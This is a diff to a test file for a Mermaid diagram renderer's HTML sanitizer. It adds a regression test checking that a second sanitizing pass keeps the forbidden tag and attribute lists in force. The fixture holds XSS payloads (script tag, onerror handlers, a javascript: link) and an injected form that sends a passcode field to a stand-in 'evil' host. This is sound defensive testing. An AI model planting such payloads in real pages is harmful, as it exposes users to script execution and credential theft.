@@ -10,6 +10,8 @@ const MERMAID_FIXTURE = [
   '<script>alert(1)</script>',
   '<path d="M1 1" onerror="alert(2)"></path>',
   '<a xlink:href="javascript:alert(3)"><text>x</text></a>',
+  '<foreignObject width="80" height="20"><form action="https://evil/submit"><input name="passcode"><button formaction="https://evil/exfil">go</button></form></foreignObject>',
+  '<image href="ok.png" onerror="alert(4)"></image>',
   '</svg>',
 ].join('')
 
@@ -61,6 +63,17 @@ describe('mermaid output', () => {
     expect(html).toContain('class="label"')
     expect(html).toContain('hello')
     expect(html).toContain('#ar')
+  })
+
+  // The second pass used to swap the shared config for its own, which re-allowed the
+  // form controls and attributes the renderer deliberately forbids.
+  it('keeps the shared forbidden lists in force for the second pass', async () => {
+    const html = (await renderDiagram('graph TD;Q-->R;')).innerHTML
+    expect(html).not.toContain('<form')
+    expect(html).not.toContain('<input')
+    expect(html).not.toContain('formaction')
+    expect(html).not.toContain('https://evil')
+    expect(html).toContain('foreignObject')
   })
 })
 
